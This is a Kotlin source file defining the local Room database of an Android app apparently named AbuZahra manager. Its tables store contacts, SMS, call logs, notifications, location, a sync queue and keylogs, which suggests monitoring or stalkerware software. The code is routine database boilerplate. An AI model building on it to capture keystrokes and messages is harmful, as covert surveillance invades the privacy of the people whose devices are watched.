package com.abuzahra.manager.database

import android.content.Context
import androidx.room.*
import com.abuzahra.manager.database.dao.*
import com.abuzahra.manager.database.entity.*

/**
 * AbuZahra Room Database
 * Local database for offline data storage and caching
 */
@Database(
    entities = [
        ContactEntity::class,
        SmsEntity::class,
        CallEntity::class,
        NotificationEntity::class,
        AppEntity::class,
        DeviceEventEntity::class,
        LocationEntity::class,
        SyncQueueEntity::class,
        KeylogEntity::class
    ],
    version = 1,
    exportSchema = false
)
@TypeConverters(Converters::class)
abstract class AbuZahraDatabase : RoomDatabase() {
    
    abstract fun contactDao(): ContactDao
    abstract fun smsDao(): SmsDao
    abstract fun callDao(): CallDao
    abstract fun notificationDao(): NotificationDao
    abstract fun appDao(): AppDao
    abstract fun deviceEventDao(): DeviceEventDao
    abstract fun locationDao(): LocationDao
    abstract fun syncQueueDao(): SyncQueueDao
    abstract fun keylogDao(): KeylogDao
    
    companion object {
        @Volatile
        private var INSTANCE: AbuZahraDatabase? = null
        
        fun getInstance(context: Context): AbuZahraDatabase {
            return INSTANCE ?: synchronized(this) {
                INSTANCE ?: buildDatabase(context).also { INSTANCE = it }
            }
        }
        
        private fun buildDatabase(context: Context): AbuZahraDatabase {
            return Room.databaseBuilder(
                context.applicationContext,
                AbuZahraDatabase::class.java,
                "abu_zahra_db"
            )
                .fallbackToDestructiveMigration()
                .enableMultiInstanceInvalidation()
                .build()
        }
    }
}

/**
 * Type Converters for Room
 */
class Converters {
    @TypeConverter
    fun fromTimestamp(value: Long?): java.util.Date? {
        return value?.let { java.util.Date(it) }
    }
    
    @TypeConverter
    fun dateToTimestamp(date: java.util.Date?): Long? {
        return date?.time
    }
    
    @TypeConverter
    fun fromStringList(value: String?): List<String> {
        return value?.split("|||")?.filter { it.isNotEmpty() } ?: emptyList()
    }
    
    @TypeConverter
    fun stringListToString(list: List<String>?): String? {
        return list?.joinToString("|||")
    }
    
    @TypeConverter
    fun fromMap(value: String?): Map<String, String> {
        if (value == null || value.isEmpty()) return emptyMap()
        return value.split("|||").associate {
            val parts = it.split("=", limit = 2)
            (parts.getOrNull(0) ?: "") to (parts.getOrNull(1) ?: "")
        }.filterKeys { it.isNotEmpty() }
    }
    
    @TypeConverter
    fun mapToString(map: Map<String, String>?): String? {
        return map?.entries?.joinToString("|||") { "${it.key}=${it.value}" }
    }
}
